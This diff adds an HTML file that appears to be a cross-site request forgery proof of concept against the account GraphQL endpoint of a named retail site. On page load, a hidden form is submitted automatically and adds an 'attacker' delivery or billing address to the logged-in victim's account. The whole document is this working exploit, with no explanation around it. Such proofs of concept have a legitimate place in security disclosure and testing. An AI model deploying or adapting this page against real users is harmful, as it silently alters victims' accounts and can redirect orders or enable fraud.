@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <meta name="referrer" content="none">
+    <meta name="referrer" content="no-referrer">
+</head>
+<body>
+      <form action="https://www.arrowfilms.com/account/graphql?operationName=AddAddress" id="csrf-form" method="POST">
+        <input name="query" value="mutation AddAddress($country: Country!, $addresseeName: String!, $addressLine1: String!, $addressLine2: String, $addressLine3: String, $addressLine4: String, $addressLine5: String, $componyName: String, $state: State, $phoneNumber: String, $postalCode: String!, $defaultDeliveryAddress: Boolean, $defaultBillingAddress: Boolean) {\n  addAddress(\n    input: {country: $country, addresseeName: $addresseeName, addressLine1: $addressLine1, addressLine2: $addressLine2, addressLine3: $addressLine3, addressLine4: $addressLine4, addressLine5: $addressLine5, companyName: $componyName, state: $state, phoneNumber: $phoneNumber, postalCode: $postalCode, defaultDeliveryAddress: $defaultDeliveryAddress, defaultBillingAddress: $defaultBillingAddress}\n  )\n}">
+        <input name="variables" value='{"addresseeName":"attacker","country":"GB","postalCode":"AB1 0AA","companyName":"attacker","addressLine1":"attacker house","addressLine2":"Attacker house, London, England","addressLine3":null,"addressLine4":"","addressLine5":"","phoneNumber":"+201010480286"}'>
+    </form>
+
+
+    <script>document.getElementById("csrf-form").submit()</script>
+</body>
+</html>
